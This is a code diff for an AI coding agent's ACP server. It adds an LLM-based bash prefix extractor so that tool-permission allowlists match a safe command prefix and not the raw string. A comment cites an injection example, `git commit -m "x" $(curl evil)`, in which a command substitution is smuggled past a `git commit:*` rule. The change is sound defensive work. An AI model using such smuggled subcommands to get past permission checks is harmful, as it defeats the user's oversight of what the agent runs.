@@ -50,6 +50,11 @@ import {
   prepareRuntimeConfig,
 } from '@kodax-ai/repl';
 import {
+  createBashPrefixExtractor,
+  resolveProvider,
+  type BashPrefixExtractor,
+} from '@kodax-ai/coding';
+import {
   AcpLogger,
   resolveAcpLogLevel,
   type AcpLogLevel,
@@ -320,6 +325,14 @@ export class KodaXAcpServer implements Agent {
   private readonly agentVersion: string;
   private readonly storage: FileSessionStorage;
   private readonly events: AcpEventEmitter;
+  /**
+   * FEATURE_153 (v0.7.38) — LLM-backed bash prefix extractor used by
+   * `isToolCallAllowed` to match allowlist patterns against the extracted
+   * safe prefix instead of naive `command.startsWith`. Server-scoped (one
+   * per `KodaXAcpServer` instance) so the LRU cache is shared across all
+   * sessions, mirroring the REPL's session-scoped pattern.
+   */
+  private readonly bashPrefixExtractor: BashPrefixExtractor;
 
   private connection: AgentSideConnection | null = null;
   private readonly sessions = new Map<string, KodaXAcpSessionState>();
@@ -349,6 +362,14 @@ export class KodaXAcpServer implements Agent {
           level: resolveAcpLogLevel(options.logLevel ?? process.env.KODAX_ACP_LOG, 'info'),
         }),
       ],
+    });
+
+    // FEATURE_153 (v0.7.38): build the bash prefix extractor once at server
+    // construction. ACP sessions share the cache across the server lifetime
+    // (one server per process; the LRU cap of 200 keeps memory bounded).
+    this.bashPrefixExtractor = createBashPrefixExtractor({
+      getProvider: () => resolveProvider(this.provider),
+      getModel: () => this.model ?? '',
     });
 
     // Initialize MCP extension runtime (non-blocking).
@@ -759,7 +780,17 @@ export class KodaXAcpServer implements Agent {
         return { allowed: true };
       }
 
-      if (isToolCallAllowed(toolName, input, session.alwaysAllowTools)) {
+      // FEATURE_153 (v0.7.38): pass extractor so allowlist patterns match
+      // against the LLM-extracted safe prefix, closing the injection surface
+      // (`git commit -m "x" $(curl evil)` no longer matches `git commit:*`).
+      if (
+        await isToolCallAllowed(
+          toolName,
+          input,
+          session.alwaysAllowTools,
+          this.bashPrefixExtractor,
+        )
+      ) {
         this.events.emit({
           type: 'tool_permission_resolved',
           sessionId: session.sessionId,
